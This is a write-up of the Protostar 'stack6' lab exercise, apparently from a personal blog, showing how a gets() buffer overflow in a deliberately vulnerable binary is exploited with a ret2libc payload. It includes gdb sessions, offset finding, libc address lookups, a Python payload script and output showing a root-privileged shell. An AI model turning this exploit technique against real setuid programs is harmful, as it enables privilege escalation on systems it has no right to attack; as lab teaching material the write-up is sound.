---
title: Protostar Writeup - stack6
updated: 2018-10-09 21:45
---

## Protostar - stack6

Moving on to the next challenge. Here's where things get interesting. This challenge is actually based on a security mechanism(not really but similar), it basically won't execute anything on the stack, so how do we exploit this binary? First have a look at the code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();  
}
```

Let's take a look at the `getpath()` method. If you've done the previous challenges this is simple, well almost. With one catch. The return address is restricted. Let's take a closer look at what this means...

```sh
$ gdb stack6
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) r
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info proc map
process 2367
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

Using this command we can see the layout of how the memory is used for the process.
From the C code we see that we can't return to any address starting with `0xbf`.
From the map above we can see that this is roughly where the stack resides.
What this means is that executing instructions from the stack is a no go.

So, now what? We can't return to any address on the stack, injecting code is useless.
We will now 'try harder'. After a little investigation I came across return oriented programming or ROP for short.
What is ROP? ROP is a way of constructing your payload by using existing code present. So instead of using our stack address to return to, We use an existing address to return to. What we're essentially doing is creating a fake stack frame. It looks kind of like this.

![Call Stack Layout](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/588px-Call_stack_layout.svg.png)

In order to call an existing function we need to follow this layout as it is a convention.
We're going to make use of the C standard library functions to craft our exploit. This is a modified ROP known as ret2libc. So basically we'll be making use of C existing library functions.

First things first, let's find the offset.

```sh
~ >>> ragg2 -P 256 -r                          
AAABAACAADAAEA...QABRABSABTABUABVABWABXAB
```

Use this as a pattern to find the offset.

```sh
(gdb) r
Starting program: /opt/protostar/bin/stack6
input path please: AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA...
...

Program received signal SIGSEGV, Segmentation fault.
0x41416241 in ?? ()

~ >>> r2 -                                     
 -- Radare2, what else?
[0x00000000]> wopO 0x41416241
80
```

So once that's done we need to go function hunting. We need 2 function addresses, one `system()` and the other `exit()`. Note that `exit()` is here to satisfy the calling convention as our return pointer. It can be any function, but this goes for a much cleaner way to do things.

We can get those two fairly trivially using gdb.

```sh
$ gdb ./stack6
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) r
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

So those are the addresses we require, note them down somewhere, we'll use them in our exploit.
But wait, there's more we need a way to tell `system()` what parameters we've given it.
We can do this by following the calling convention. But since we can't store anything on the stack, we need another way. Why not use libc itself again, since we're ret2libc'ing anyways. What we need is an address to a string which says "/bin/sh", for a way to get `system()` to spawn a shell for us.

Here's how we do that...(assuming we know where libc is located)

```sh
$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
 11f3bf /bin/sh
```

Now this address is actually the offset. So we need to add this to the beginning of the address at which libc is loaded. From the memory map way above, we see that it starts at `0xb7e97000` so the actual location of the string will be `0xb7e97000 + 0x11f3bf`. This will be important for our exploit.

Now we can finally craft our exploit...

```python
import struct
def go():
  libc_start = 0xb7e97000
  string_offset = 0x11f3bf
  string_loc = libc_start + string_offset
  system_loc = 0xb7ecffb0
  exit_loc = 0xb7ec60c0
  padding = 'A' * 80
  payload = padding
  payload += struct.pack("I", system_loc)
  payload += struct.pack("I", exit_loc)
  payload += struct.pack("I", string_loc)
  print payload
go()
```

Exploiting in 3...2...1...using cat to hold the input.

```sh
$ (python /tmp/exploit.py; cat) | ./stack6
user@protostar:/opt/protostar/bin$ (python /tmp/exploit_stack6.py; cat) | ./stack6
input path please: got path AAA...
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
And there you have it. Another fun challenge, this time by reusing existing resources by ROP.
I was pretty amused by this, I hope that you are too. Until next time, cheers!

P.S. The exploit-exercises website is most probably [dead](https://www.reddit.com/r/LiveOverflow/comments/9jyqmm/exploit_exercises_website_not_working/).

### Sites

[Call Stack](https://en.wikipedia.org/wiki/Call_stack#Stack_and_frame_pointers)
[Phrack](http://phrack.org/issues/49/14.html)
[Detailed ret2libc](https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/2)
